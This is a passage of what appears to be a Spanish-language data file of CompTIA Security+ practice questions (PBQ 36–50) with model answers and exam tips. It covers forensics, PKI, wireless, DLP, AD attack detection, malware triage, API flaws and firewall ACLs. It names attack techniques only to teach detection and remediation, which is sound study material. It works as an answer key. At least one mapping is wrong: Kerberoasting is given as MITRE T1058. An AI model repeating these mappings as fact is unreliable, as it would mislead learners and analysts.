      'CyberKraft Tip: CompTIA evalúa frecuentemente estas cabeceras: HSTS previene SSL Stripping (forzando HTTPS). CSP previene XSS al restringir de dónde se cargan scripts. X-Frame-Options: DENY previene Clickjacking (impedir que la página sea embebida en un iframe). TLS 1.3 garantiza Perfect Forward Secrecy.'
  },

  // PBQ 36: Forensic Legal Hold & Evidence Chain of Custody
  {
    id: 'pbq-36',
    number: 36,
    category: 'forensic-hold',
    categoryTitle: 'Forense Digital, E-Discovery y Cadena de Custodia',
    title: 'Procedimiento de Retención Judicial (Legal Hold), Adquisición Bit-a-Bit y Admisibilidad',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.8: Explicar las actividades apropiadas de respuesta a incidentes.',
    scenario:
      'Tras detectarse una exfiltración masiva de secretos comerciales por un empleado desleal, la empresa recibe una notificación de Legal Hold de la fiscalía. Debes ordenar las 6 fases cronológicas obligatorias del procedimiento pericial y responder a dos principios probatorios fundamentales para garantizar la validez judicial bajo la Best Evidence Rule.',
    requirements: [
      'Paso 1: Notificación formal de Legal Hold para congelar cualquier purga o sobreescritura de datos.',
      'Paso 2: Registro inmediato en formulario de Cadena de Custodia (Chain of Custody Log).',
      'Paso 3: Adquisición Bit-a-Bit utilizando un Hardware Write Blocker para no alterar metadatos MACB.',
      'Paso 4: Cálculo y verificación del hash criptográfico SHA-256 para demostrar integridad matemática.',
      'Paso 5: Ejecución del análisis forense exclusivamente en una copia de trabajo aislada (Sandbox).',
      'Paso 6: Custodia del soporte original en caja fuerte ignífuga bajo doble autenticación.',
      'Orden de Volatilidad: Adquirir la memoria RAM volátil ANTES de apagar o extraer el disco duro.',
      'Admisibilidad: Cumplir con la Best Evidence Rule (copia bit-stream idéntica verificada con hash).'
    ],
    tacticalTip:
      'CyberKraft Tip: En informática forense CompTIA, NUNCA se analiza el disco original (se analiza la copia forense de trabajo). El Legal Hold detiene la destrucción de datos. El Write Blocker previene alteraciones accidentales. La memoria RAM se volca antes de apagar el equipo (RFC 3227).'
  },

  // PBQ 37: PKI Lifecycle, OCSP Stapling, X.509 Formats & Key Escrow
  {
    id: 'pbq-37',
    number: 37,
    category: 'cryptography-vpn',
    categoryTitle: 'PKI, Certificados X.509 y Gestión de Claves',
    title: 'Gestión de Ciclo de Vida PKI, Formatos X.509 (.PFX/.PEM), OCSP Stapling y Key Escrow',
    estimatedMinutes: 5,
    domain: 'Dominio 1: Conceptos Generales de Seguridad',
    sy0701Objective: 'Objetivo 1.4: Explicar la importancia de usar soluciones criptográficas apropiadas.',
    scenario:
      'Como administrador de la PKI corporativa, debes resolver cinco requerimientos arquitectónicos: verificar la revocación de certificados en tiempo real sin sobrecargar a la CA ni filtrar la navegación de los clientes (OCSP Stapling), seleccionar el formato binario que agrupa el certificado y la clave privada protegida con contraseña (.PFX / PKCS#12), identificar el formato ASCII Base64 estándar para servidores Linux (.PEM), proteger múltiples dominios bajo un mismo certificado (extensión SAN) e implementar la recuperación de claves cifradas de empleados sin riesgo de abuso (Key Escrow con M-de-N).',
    requirements: [
      'Revocación: Configurar OCSP Stapling (RFC 6066) para que el servidor web adjunte la respuesta sellada de la CA en el handshake TLS.',
      'Formato con clave privada: Seleccionar .PFX / .P12 (PKCS#12) con contraseña para exportación/importación segura.',
      'Formato Linux / Apache: Seleccionar .PEM (Base64 ASCII delimitado por -----BEGIN CERTIFICATE-----).',
      'Multidominio: Configurar la extensión SAN (Subject Alternative Name) para listar múltiples FQDNs.',
      'Recuperación de claves: Implementar Key Escrow con esquema M-de-N (Split Knowledge) para control dual.'
    ],
    tacticalTip:
      'CyberKraft Tip: CompTIA evalúa minuciosamente los formatos PKI: .PFX/.P12 es binario y contiene la clave privada con password; .P7B contiene certificados pero NUNCA la clave privada; .PEM es Base64 ASCII; .DER es binario puro. OCSP Stapling ahorra latencia al cliente y protege su privacidad. Key Escrow permite recuperar datos con control dual (M de N custodios).'
  },

  // PBQ 38: Wireless WPA3-Enterprise, 802.1X & WIPS
  {
    id: 'pbq-38',
    number: 38,
    category: 'wireless-hardening',
    categoryTitle: 'Seguridad Inalámbrica Empresarial (802.1X / WPA3)',
    title: 'Arquitectura WiFi Corporativa: WPA3-Enterprise, 802.1X EAP-TLS y WIPS',
    estimatedMinutes: 5,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.1: Dado un escenario, aplicar técnicas de seguridad comunes a los recursos informáticos. (relacionado: 3.2)',
    scenario:
      'La empresa sufrió un ataque de Evil Twin (Gemelo Malvado) donde atacantes clonaron el SSID para robar credenciales. Debes diseñar la arquitectura inalámbrica corporativa definitiva: estándar WPA3-Enterprise modo 192 bits (Suite-B), método 802.1X EAP-TLS con certificados mutuos, puertos estándar del servidor RADIUS (1812/1813), handshake SAE para WPA3-Personal y despliegue de WIPS con supresión RF automática.',
    requirements: [
      'Estándar WiFi: WPA3-Enterprise 192 bits (Suite-B CNSA con AES-256 GCM).',
      'Autenticación 802.1X: EAP-TLS exigiendo certificados digitales mutuos (servidor RADIUS y cliente).',
      'Servidor AAA: Configurar puertos oficiales IANA UDP 1812 (Autenticación) y UDP 1813 (Accounting).',
      'Handshake Anti-Fuerza Bruta: En WPA3-Personal, implementar SAE (Simultaneous Authentication of Equals / Dragonfly).',
      'Defensa Anti-Rogue AP: Sistema WIPS con monitoreo RF continuo y supresión activa de Gemelos Malvados.'
    ],
    tacticalTip:
      'CyberKraft Tip: EAP-TLS es la respuesta correcta cuando CompTIA exige certificados mutuos y máxima seguridad. PEAP solo usa certificado en el servidor. WPA3 reemplaza el vulnerable 4-way handshake de WPA2 por SAE (Dragonfly), erradicando el crackeo offline. RADIUS utiliza puertos UDP 1812/1813.'
  },

  // PBQ 39: Cloud Storage DLP & CASB Data Classification
  {
    id: 'pbq-39',
    number: 39,
    category: 'cloud-dlp',
    categoryTitle: 'Protección de Datos en la Nube (Cloud DLP & CASB)',
    title: 'Clasificación de Datos en Cloud Storage, Reglas Regex DLP y CASB Inline',
    estimatedMinutes: 5,
    domain: 'Dominio 3: Arquitectura de Seguridad',
    sy0701Objective: 'Objetivo 3.3: Comparar y contrastar conceptos y estrategias para proteger los datos. (relacionado: 4.5)',
    scenario:
      'Una auditoría reveló cuatro depósitos de almacenamiento cloud (S3 / Blob) con datos corporativos expuestos. Clasifica cada depósito en su nivel de confidencialidad oficial (Público, Interno, Confidencial, Restringido/PII), asigna el filtro regex de inspección DLP adecuado (tarjetas PCI-DSS, SSN de nóminas, secretos API), y configura el broker CASB en modo Inline con claves gestionadas por el cliente (Customer-Managed Keys en Cloud HSM).',
    requirements: [
      'Depósito 1 (Web Assets): Clasificación Pública sin necesidad de inspección DLP.',
      'Depósito 2 (Pasarela de Pago): Clasificación Restringido/PII con DLP para números de tarjeta (PAN) PCI-DSS.',
      'Depósito 3 (Nóminas RRHH): Clasificación Confidencial con DLP para Número de Seguro Social (SSN).',
      'Depósito 4 (DevOps API): Clasificación Confidencial con DLP para tokens y claves privadas de API.',
      'Broker CASB: Modo Reverse Proxy Inline para prevención activa de fugas en tiempo real.',
      'Gestión de Claves: Customer-Managed Keys (CMK / BYOK) alojadas en módulo HSM FIPS 140-2 Nivel 3.'
    ],
    tacticalTip:
      'CyberKraft Tip: En DLP: los números de tarjeta caen bajo PCI-DSS; los números de seguridad social bajo PII; y las claves bajo Secretos. Para bloquear fugas ANTES de que el archivo toque el almacenamiento cloud, se requiere CASB Inline (Proxy); el modo API es reactivo/asíncrono.'
  },

  // PBQ 40: Social Engineering Attacks, Psychological Triggers & Defenses
  {
    id: 'pbq-40',
    number: 40,
    category: 'social-engineering',
    categoryTitle: 'Ingeniería Social y Vectores de Amenaza Humana',
    title: 'Matriz de Ataques de Ingeniería Social, Disparadores Psicológicos y Defensas',
    estimatedMinutes: 5,
    domain: 'Dominio 2: Amenazas, Vulnerabilidades y Mitigaciones',
    sy0701Objective: 'Objetivo 2.2: Explicar vectores de amenaza y superficies de ataque comunes. (relacionado: 5.6)',
    scenario:
      'El departamento de seguridad analiza 5 ataques dirigidos recientes: un intento de BEC al CFO fingiendo ser el CEO, una llamada de vishing urgente al Helpdesk, memorias USB dejadas en el estacionamiento, un pretexting de cambio de cuenta bancaria de un proveedor y un ataque de Watering Hole en el portal de la asociación del sector. Identifica el disparador psicológico de persuasión y la contramedida primaria para cada vector.',
    requirements: [
      'Caso 1 (Spear Phishing / BEC): Disparador Autoridad -> Defensa: DMARC + Verificación fuera de banda (Out-of-band call).',
      'Caso 2 (Vishing a Helpdesk): Disparador Urgencia -> Defensa: Procedimiento de devolución de llamada verificada.',
      'Caso 3 (USB Baiting): Disparador Escasez/Curiosidad -> Defensa: Deshabilitar almacenamiento USB masivo por GPO.',
      'Caso 4 (Pretexting Proveedor): Disparador Familiaridad -> Defensa: Formación y concienciación continua en seguridad.',
      'Caso 5 (Watering Hole): Disparador Consenso/Prueba Social -> Defensa: Concienciación + Aislamiento web y EDR.'
    ],
    tacticalTip:
      'CyberKraft Tip: CompTIA se basa en los principios de Robert Cialdini: El CEO usa Autoridad; "paga antes de las 5pm o nos cortan el servicio" usa Urgencia; "solo para los primeros 5 empleados" usa Escasez; suplantar al colega amigo usa Familiaridad; "todas las demás empresas lo usan" usa Consenso. Para USB Baiting, la defensa técnica infalible es bloquear USBs mediante GPO.'
  },

  // PBQ 41: Cloud Shared Responsibility Model (IaaS, PaaS, SaaS)
  {
    id: 'pbq-41',
    number: 41,
    category: 'cloud-shared-responsibility',
    categoryTitle: 'Seguridad Cloud y Modelo de Responsabilidad Compartida',
    title: 'Matriz de Responsabilidad Compartida en la Nube (IaaS vs PaaS vs SaaS)',
    estimatedMinutes: 5,
    domain: 'Dominio 3: Arquitectura de Seguridad',
    sy0701Objective: 'Objetivo 3.1: Comparar y contrastar las implicaciones de seguridad de distintos modelos de arquitectura.',
    scenario:
      'La organización opera servicios en entornos multi-cloud híbridos (AWS EC2, Azure App Services y Microsoft 365). Debes delimitar con precisión la responsabilidad operativa y de seguridad (Cliente vs Proveedor Cloud / CSP) en cada capa del stack tecnológico para evitar brechas por configuración desatendida.',
    requirements: [
      'Seguridad Física del Data Center: 100% responsabilidad del CSP en IaaS, PaaS y SaaS.',
      'Hipervisor y Red Física Subyacente: 100% responsabilidad del CSP en IaaS, PaaS y SaaS.',
      'Parches del Sistema Operativo de Instancias: Responsabilidad del Cliente en IaaS; del CSP en PaaS y SaaS.',
      'Configuración de Red / Security Groups: Responsabilidad del Cliente en IaaS y PaaS; del CSP en SaaS.',
      'Código de Aplicación y APIs: Responsabilidad del Cliente en IaaS y PaaS; del CSP en SaaS.',
      'Datos, Control de Acceso IAM y Gestión de Cuentas: Responsabilidad 100% incondicional del Cliente en los tres modelos.'
    ],
    tacticalTip:
      'CyberKraft Tip: ¡Pregunta clásica de examen! En la nube pública: la seguridad física de las instalaciones NUNCA es del cliente (siempre del CSP). Y los DATOS junto con la gestión de IDENTIDADES (IAM) NUNCA son del CSP (siempre del cliente, incluso en SaaS como M365 o Salesforce).'
  },

  // PBQ 42: MITRE ATT&CK Threat Hunting, Windows Events & Active Directory
  {
    id: 'pbq-42',
    number: 42,
    category: 'mitre-threat-hunting',
    categoryTitle: 'Operaciones de Seguridad, SIEM y MITRE ATT&CK',
    title: 'Investigación de Ataques a Active Directory, Telemetría SIEM y MITRE ATT&CK',
    estimatedMinutes: 6,
    domain: 'Dominio 2: Amenazas, Vulnerabilidades y Mitigaciones',
    sy0701Objective: 'Objetivo 2.4: Dado un escenario, analizar indicadores de actividad maliciosa. (relacionado: 4.9)',
    scenario:
      'El equipo del Centro de Operaciones de Seguridad (SOC) ha detectado múltiples alertas de telemetría en los Domain Controllers y endpoints corporativos. Correlaciona cada escenario de ataque con su técnica oficial MITRE ATT&CK, su Event ID forense característico en Windows Security Logs y la mitigación oficial prescrita por CompTIA.',
    requirements: [
      'Caso 1 (Kerberoasting): MITRE T1058 -> Telemetría Event ID 4769 con cifrado RC4 -> Mitigación: gMSA forzando AES-256.',
      'Caso 2 (Mimikatz / LSASS Dumping): MITRE T1003 -> Telemetría Event ID 4624 Tipo 9 / Acceso a lsass.exe -> Mitigación: Windows Defender Credential Guard.',
      'Caso 3 (Responder / LLMNR Poisoning): MITRE T1557.001 -> Telemetría Event ID 4625 y tráfico UDP 5355 -> Mitigación: Deshabilitar LLMNR/NetBIOS por GPO y SMB Signing.',
      'Caso 4 (Golden Ticket): MITRE T1558.001 -> Telemetría Event ID 4768 con TGT de 10 años sin logon previo -> Mitigación: Resetear contraseña KRBTGT dos veces.',
      'Caso 5 (PowerShell Fileless): MITRE T1059.001 -> Telemetría Event ID 4104 ScriptBlock con comandos Base64 -> Mitigación: Constrained Language Mode y WDAC/AppLocker.'
    ],
    tacticalTip:
      'CyberKraft Tip: CompTIA evalúa con frecuencia los Event IDs de Active Directory: 4769 es solicitud de ticket de servicio (Kerberoasting); 4768 es TGT request (Golden Ticket); 4624 es Logon exitoso (Tipo 9 = NewCredentials); 4625 es Logon fallido; 4104 es PowerShell Script Block Logging. Credential Guard aísla LSASS en un contenedor virtualizado (VBS).'
  },

  // PBQ 43: Data Governance, Roles, Lifecycle & Sanitization (NIST SP 800-88)
  {
    id: 'pbq-43',
    number: 43,
    category: 'data-governance',
    categoryTitle: 'Gobernanza de Datos, Roles y Sanitización NIST SP 800-88',
    title: 'Gobernanza de Datos, Roles de Custodia, Estados del Dato y Sanitización',
    estimatedMinutes: 6,
    domain: 'Dominio 5: Gestión y Supervisión del Programa de Seguridad',
    sy0701Objective: 'Objetivo 5.1: Resumir los elementos de una gobernanza de seguridad eficaz. (relacionado: 4.2)',
    scenario:
      'Eres el Chief Information Security Officer (CISO) de una corporación multinacional regulada por GDPR e ISO 27001. Debes estructurar la política corporativa de gobernanza asignando los roles clave (Data Owner, Data Steward, Data Custodian, DPO), estableciendo las medidas técnicas para los tres estados del dato (en tránsito, en reposo y en uso), y definiendo la metodología de sanitización certificada según NIST SP 800-88 Rev 1 para el desmantelamiento de medios de almacenamiento.',
    requirements: [
      'Roles: Asigna el Data Owner (propietario del negocio que clasifica y autoriza accesos), Data Steward (gestión de calidad y etiquetado), Data Custodian (administración técnica de backups y cifrado) y Data Privacy Officer (cumplimiento regulatorio GDPR).',
      'Estados del Dato: Protege los datos En Tránsito con TLS 1.3 / IPsec, En Reposo con AES-256 BitLocker / TDE, y En Uso mediante Computación Confidencial (Enclaves de CPU / TEE).',
      'Sanitización NIST SP 800-88: Configura Clearing (reescritura lógica de sectores para reutilización interna), Purging (Degaussing / desmagnetización para HDD magnéticos), Destrucción Física (trituración mecánica Shredding para fin de vida de SSD/NVMe) y Crypto-shredding (destrucción de claves KMS para entornos Cloud).'
    ],
    tacticalTip:
      'CyberKraft Tip: CompTIA evalúa con rigor los roles de datos: el Data Owner es un ejecutivo de negocio responsable legal y de clasificación; el Data Custodian es TI que implementa los controles técnicos; el Data Steward asegura la precisión y metadata. En NIST SP 800-88: Clear permite reutilización interna; Purge impide recuperación forense de laboratorio; Destroy es fin de ciclo de vida con certificado. En Cloud, cuando no tocas el hardware, sanitizas con Crypto-shredding (destruyendo la clave DEK/KEK).'
  },

  // PBQ 44: Privacy Enhancing Technologies (PETs) & Data Obfuscation
  {
    id: 'pbq-44',
    number: 44,
    category: 'privacy-pets',
    categoryTitle: 'Privacidad y Tecnologías de Mejora de la Privacidad (PETs)',
    title: 'Técnicas de Ofuscación de Datos, PETs y Niveles de Reversibilidad',
    estimatedMinutes: 5,
    domain: 'Dominio 3: Arquitectura de Seguridad',
    sy0701Objective: 'Objetivo 3.3: Comparar y contrastar conceptos y estrategias para proteger los datos.',
    scenario:
      'Un banco y proveedor de servicios sanitarios necesita armonizar sus operaciones con PCI-DSS v4.0, HIPAA y GDPR. Para cada caso de negocio, debes seleccionar la tecnología de preservación de privacidad (PET) idónea (Tokenización, Enmascaramiento Estático o Dinámico, Anonimización o Seudonimización) y especificar su grado de reversibilidad técnica.',
    requirements: [
      'Caso 1 (PCI-DSS): Implementa Tokenización (Tokenization) con bóveda centralizada para aislar números de tarjeta PAN del alcance auditor.',
      'Caso 2 (Dev/QA): Aplica Enmascaramiento Estático (Static Data Masking) irreversible en la copia de base de datos antes de transferirla a desarrollo.',
      'Caso 3 (Call Center): Configura Enmascaramiento Dinámico (Dynamic Data Masking) en la capa de presentación para mostrar solo los últimos 4 dígitos en pantalla.',
      'Caso 4 (Epidemiología): Aplica Anonimización (Anonymization) irreversible sin tabla de mapeo para liberar los datos del marco de GDPR (Recital 26).',
      'Caso 5 (Ensayos Clínicos): Selecciona Seudonimización (Pseudonymization) conservando la clave de mapeo cifrada y aislada para re-identificación en emergencias médicas.'
    ],
    tacticalTip:
      'CyberKraft Tip: CompTIA SY0-701 enfatiza la diferencia entre Anonimización (irreversible por diseño, sin posibilidad matemática de volver a asociar al individuo, exento de GDPR) y Seudonimización (reversible mediante una clave o tabla de correspondencia guardada por separado, sigue sujeto a GDPR). Para tarjetas de crédito (PCI-DSS), Tokenization es la respuesta estándar de examen porque saca los sistemas del "cardholder data environment" (CDE).'
  },

  // PBQ 45: Comprehensive Malware Triage - Parte 1 (Endpoints & Criptografía)
  {
    id: 'pbq-45',
    number: 45,
    category: 'malware-triage',
    categoryTitle: 'Análisis Forense y Clasificación de Malware (Parte 1)',
    title: 'Triage de Malware: Amenazas a Endpoints, Criptografía y Persistencia en Memoria',
    estimatedMinutes: 6,
    domain: 'Dominio 2: Amenazas, Vulnerabilidades y Mitigaciones',
    sy0701Objective: 'Objetivo 2.4: Dado un escenario, analizar indicadores de actividad maliciosa.',
    scenario:
      'Como analista de respuesta a incidentes del SOC Tier 2, has recibido cinco alertas críticas de estaciones de trabajo y servidores corporativos. A partir de los síntomas clínicos observados y los registros de telemetría forense, identifica la cepa exacta de malware (Ransomware, RAT, Rootkit de Kernel, Spyware/InfoStealer o Malware Sin Archivos / Fileless) y prescribe la acción técnica de remediación obligatoria según los estándares de CompTIA y NIST.',
    requirements: [
      'Caso 1: Identifica Ransomware (cifrado masivo `.locked` y borrado de VSS con `vssadmin`) -> Remediación: Aislar de red y restaurar desde backups inmutables/offline 3-2-1.',
      'Caso 2: Identifica Remote Access Trojan - RAT (utilidad gratuita con socket TCP inverso y control de periféricos) -> Remediación: Aislar host, matar proceso en memoria, eliminar persistencia en registro y rotar credenciales.',
      'Caso 3: Identifica Rootkit de Modo Kernel / UEFI (invisibilidad ante `ps`/`netstat` y evasión de antivirus en usuario) -> Remediación: Reinstalación limpia desde cero (Clean Reimaging), flasheo seguro de firmware y UEFI Secure Boot.',
      'Caso 4: Identifica Spyware / InfoStealer & Keylogger (robo pasivo de pulsaciones y cookies de navegador hacia C2) -> Remediación: Erradicación con EDR, invalidación de tokens de sesión, rotación de contraseñas y MFA resistente FIDO2.',
      'Caso 5: Identifica Malware Sin Archivos / Fileless (ejecución Living-off-the-Land en RAM mediante PowerShell Base64) -> Remediación: Reiniciar equipo para vaciar RAM, activar Constrained Language Mode y WDAC/AppLocker.'
    ],
    tacticalTip:
      'CyberKraft Tip: En CompTIA Security+, si los procesos se ocultan del Administrador de Tareas a nivel de llamadas al sistema (hooking de SSDT), SIEMPRE es un Rootkit de Kernel y la única solución aceptable es Clean Reimaging. Si hay scripts PowerShell codificados sin ejecutables en disco, es Fileless (LotL) y se remedia con Constrained Language Mode y AppLocker.'
  },

  // PBQ 46: Comprehensive Malware Triage - Parte 2 (Amenazas de Red, Lógica y Evasión Avanzada)
  {
    id: 'pbq-46',
    number: 46,
    category: 'malware-triage',
    categoryTitle: 'Análisis Forense y Clasificación de Malware (Parte 2)',
    title: 'Triage de Malware: Amenazas de Red, Código Latente y Evasión Polimórfica',
    estimatedMinutes: 6,
    domain: 'Dominio 2: Amenazas, Vulnerabilidades y Mitigaciones',
    sy0701Objective: 'Objetivo 2.4: Dado un escenario, analizar indicadores de actividad maliciosa.',
    scenario:
      'El centro de comando de ciberseguridad monitorea una serie de anomalías de red y fallos imprevistos en la infraestructura. Examina los registros de tráfico, patrones de comunicación C2 y telemetría de procesos para clasificar cada amenaza (Gusano de Red, Botnet Zombi, Bomba Lógica, Cryptojacking o Malware Polimórfico) y ejecutar la estrategia de contención correspondiente.',
    requirements: [
      'Caso 1: Identifica Gusano de Red / Worm (propagación lateral autónoma por puerto TCP 445 SMB sin interacción humana) -> Remediación: Aislar VLAN, deshabilitar SMBv1 por GPO, parchear el SO y microsegmentar.',
      'Caso 2: Identifica Botnet / Agente Zombi C2 (balizas periódicas sincronizadas a dominios DGA para ataque DDoS coordinado) -> Remediación: Implementar DNS Sinkhole para capturar DGA, bloquear C2 en NGFW y limpiar bots con EDR.',
      'Caso 3: Identifica Bomba Lógica / Logic Bomb (código latente condicional activado por despido de empleado) -> Remediación: Restaurar datos desde copias inmutables, auditar tareas programadas, revisión por pares y offboarding estricto.',
      'Caso 4: Identifica Cryptojacking / Cryptominer (CPU al 100% permanente y tráfico Stratum puerto 3333 a pools de minería) -> Remediación: Finalizar procesos maliciosos de minería, bloquear puertos de pools en firewall y auditar accesos.',
      'Caso 5: Identifica Malware Polimórfico / Metamórfico (mutación continua de rutinas y hashes que evaden antivirus tradicional) -> Remediación: Implementar EDR con análisis heurístico de comportamiento, IA y detonación en Sandbox.'
    ],
    tacticalTip:
      'CyberKraft Tip: CompTIA evalúa la diferencia crítica entre Worm y Virus: el Worm se propaga solo a través de la red sin necesidad de que un usuario ejecute un archivo. Una Botnet utiliza "beaconing" (comunicación periódica constante) hacia un servidor C2. Y el Malware Polimórfico altera su hash en cada infección, haciendo inútiles las firmas tradicionales; la respuesta correcta siempre involucra detección heurística/comportamental basada en EDR o Sandbox.'
  },

  // PBQ 47: Secure Software Development & OWASP API Top 10
  {
    id: 'pbq-47',
    number: 47,
    category: 'api-security',
    categoryTitle: 'Seguridad en Desarrollo de Software (SDLC) & OWASP API Top 10',
    title: 'Auditoría de Seguridad de APIs REST: BOLA, SSRF, JWT Tampering y Rate Limiting',
    estimatedMinutes: 6,
    domain: 'Dominio 2: Amenazas, Vulnerabilidades y Mitigaciones',
    sy0701Objective: 'Objetivo 2.3: Explicar varios tipos de vulnerabilidades. (relacionado: 4.1)',
    scenario:
      'Como DevSecOps Engineer en una fintech multinacional, debes auditar cinco endpoints REST expuestos al público y microservicios internos que presentan fallos críticos de seguridad. Analiza las peticiones HTTP/cURL, payloads JSON y código de backend para identificar la vulnerabilidad según OWASP API Top 10 y prescribir el control técnico de remediación estricto según los estándares de CompTIA Security+ SY0-701.',
    requirements: [
      'Caso 1: Identifica BOLA / IDOR (Broken Object Level Authorization) en endpoint de perfil /api/v1/users/502 -> Remediación: Validar propiedad del objeto contra la sesión autenticada con RBAC en el backend.',
      'Caso 2: Identifica SSRF (Server-Side Request Forgery) contra metadatos de nube 169.254.169.254 -> Remediación: Lista blanca de URLs, bloquear 169.254.0.0/16 y forzar IMDSv2 con tokens de sesión.',
      'Caso 3: Identifica Falsificación de Tokens JWT con "alg: none" aceptado -> Remediación: Rechazar tokens con "alg: none", forzar RS256/ES256 y validar firma contra JWKS público.',
      'Caso 4: Identifica Inyección SQL en parámetros de endpoint REST -> Remediación: Uso obligatorio de Consultas Preparadas (Prepared Statements) u ORM parametrizado.',
      'Caso 5: Identifica Falta de Limitación de Recursos y Rate Limiting (Credential Stuffing masivo) -> Remediación: Configurar Rate Limiting (Token Bucket) en API Gateway, reglas WAF y CAPTCHA adaptativo.'
    ],
    tacticalTip:
      'CyberKraft Tip: En CompTIA Security+, BOLA (Broken Object Level Authorization / IDOR) ocurre cuando un usuario autenticado puede acceder a los registros de otro cambiando un parámetro en la URL (/users/100 -> /users/101). SSRF contra 169.254.169.254 extrae credenciales temporales del IAM en AWS/GCP y se mitiga forzando IMDSv2 y listas blancas. Para JWT, NUNCA se debe aceptar el algoritmo "none" y la inyección SQL siempre se remedia con Prepared Statements.'
  },

  // PBQ 48: SIEM Correlation Rules & SOAR Playbook Automation
  {
    id: 'pbq-48',
    number: 48,
    category: 'soar-automation',
    categoryTitle: 'Operaciones de SOC, SIEM & Automatización SOAR',
    title: 'Ingeniería de Detección en SIEM y Playbooks Automatizados en SOAR',
    estimatedMinutes: 6,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.7: Explicar la importancia de la automatización y orquestación en las operaciones seguras. (relacionado: 4.4)',
    scenario:
      'El Centro de Operaciones de Seguridad (SOC) Tier 2 recibe una avalancha de registros y alertas de múltiples fuentes (Active Directory, EDR, NGFW, Cloud IdP y Proxies). Como SOC Automation Engineer, debes construir reglas de correlación SIEM precisas para detectar amenazas en tiempo real y diseñar playbooks de respuesta automatizada en la plataforma SOAR para contener los incidentes sin intervención humana inmediata, reduciendo el MTTD y MTTR.',
    requirements: [
      'Caso 1: Identifica Viaje Imposible (Impossible Travel Anomaly) en IdP Cloud (inicios de sesión distantes en <10 min) -> Acción SOAR: Revocar tokens de sesión en IdP, forzar cambio de contraseña y exigir desafío MFA FIDO2.',
      'Caso 2: Identifica Pico Masivo de I/O de Archivos y Borrado de Copias de Sombra (Ransomware activo) -> Acción SOAR: Aislar host de red mediante agente EDR y bloquear IP de baliza C2 en NGFW perimetral.',
      'Caso 3: Identifica Proceso Hijo PowerShell invocado por Office con socket de red WAN (Phishing / Reverse Shell) -> Acción SOAR: Terminar árbol de procesos, aislar host y purgar el correo de todos los buzones por API.',
      'Caso 4: Identifica Ráfaga de Fuerza Bruta SSH (>50 fallos en 60s en puerto 22) -> Acción SOAR: Insertar regla de denegación temporal (IP Ban) en la lista dinámica del NGFW perimetral.',
      'Caso 5: Identifica Adición No Autorizada al Grupo Domain Admins fuera de horario comercial (Event ID 4728) -> Acción SOAR: Eliminar usuario de Domain Admins, deshabilitar cuenta y alertar al analista de guardia.'
    ],
    tacticalTip:
      'CyberKraft Tip: Para CompTIA Security+, la clave de SOAR es la velocidad de contención orquestada (Playbooks/Runbooks) conectando herramientas dispares (SIEM -> EDR -> Firewall -> IAM). Cuando detectes "Impossible Travel", la respuesta siempre es revocar tokens de sesión y forzar MFA. Con Ransomware, aísla de inmediato el host en el EDR para cortar la propagación lateral. Con fuerza bruta perimetral, inyecta reglas de bloqueo temporal dinámico en el firewall.'
  },

  // PBQ 49: Advanced Stateful Firewall ACLs & DMZ Multi-Tier Filtering (Tier S - Alta Probabilidad)
  {
    id: 'pbq-49',
    number: 49,
    category: 'firewall-acl',
    categoryTitle: 'Configuración de Firewall de Próxima Generación (Tier S - Alta Probabilidad)',
    title: 'Filtrado de Tráfico Multi-Interfaz: WAN, DMZ Pública, LAN Interna y Base de Datos PCI-DSS',
    estimatedMinutes: 6,
    domain: 'Dominio 3: Arquitectura de Seguridad',
    sy0701Objective: 'Objetivo 3.2: Dado un escenario, aplicar principios de seguridad para asegurar la infraestructura empresarial. (relacionado: 4.5)',
    scenario:
      'Una entidad bancaria despliega un nuevo Firewall de Próxima Generación (NGFW) que interconecta cuatro zonas de red: WAN (Internet pública), DMZ (172.16.10.0/24), LAN Corporativa (10.0.20.0/24) y la Subred Aislada PCI-DSS (10.0.30.0/24) que contiene la Base de Datos transaccional PostgreSQL. Como Security Engineer, debes configurar la tabla de reglas ACL respetando estrictamente el principio de First-Match y Menor Privilegio para permitir servicios web y de correo en la DMZ, habilitar consultas de la DMZ a la base de datos interna, permitir salida web segura a los empleados y bloquear categóricamente cualquier intento de conexión directa desde el exterior o la DMZ hacia la LAN corporativa y la base de datos.',
    requirements: [
      'Regla 1: Permitir tráfico web HTTPS entrante desde WAN (any) hacia el Servidor Web en DMZ (172.16.10.10) por TCP 443.',
      'Regla 2: Permitir recepción de correo seguro SMTPS desde WAN (any) hacia la Pasarela de Correo en DMZ (172.16.10.20) por TCP 465.',
      'Regla 3: Permitir consultas transaccionales de base de datos ÚNICAMENTE desde el Servidor Web (172.16.10.10) hacia el servidor PostgreSQL (10.0.30.50) por TCP 5432.',
      'Regla 4: Denegar explícitamente todo tráfico originado en la DMZ (172.16.10.0/24) con destino a la LAN interna (10.0.20.0/24) para prevenir movimientos laterales.',
      'Regla 5: Permitir tráfico de navegación web saliente desde la LAN Corporativa (10.0.20.0/24) hacia WAN (any) por TCP 443 a través del Gateway seguro.',
      'Regla 6: Denegar acceso directo desde WAN (any) hacia la Subred de Datos PCI-DSS (10.0.30.0/24) en cualquier protocolo y puerto.',
      'Regla 7: Asegurar la Denegación Implícita (Implicit Deny Any Any) al final absoluto de la tabla de reglas.'
    ],
    tacticalTip:
      'CyberKraft Tip: En CompTIA Security+, las PBQs de Firewall son de las más probables (Tier S ~95%). Recuerda tres reglas de oro: 1) First-Match: una regla DENY ALL al principio romperá todo el tráfico legítimo. 2) Menor privilegio: la base de datos (puerto 5432 o 3306) NUNCA debe aceptar conexiones de WAN ni de toda la DMZ, sino solo de la IP exacta del servidor de aplicaciones (172.16.10.10). 3) Aislamiento DMZ-LAN: la DMZ existe para ser comprometida sin que el atacante pueda saltar a las computadoras de los empleados en la LAN.'
  },

  // PBQ 50: Endpoint & Network Port Hardening + Protocol Migration Audit (Tier S - Alta Probabilidad)
  {
    id: 'pbq-50',
    number: 50,
    category: 'port-security',
    categoryTitle: 'Auditoría de Puertos y Protocolos Empresariales (Tier S - Alta Probabilidad)',
    title: 'Hardening de Infraestructura y Migración de Protocolos Legados (SOC 2 / ISO 27001)',
    estimatedMinutes: 6,
    domain: 'Dominio 4: Operaciones de Seguridad',
    sy0701Objective: 'Objetivo 4.5: Dado un escenario, modificar las capacidades empresariales para mejorar la seguridad. (relacionado: 5.4)',
    scenario:
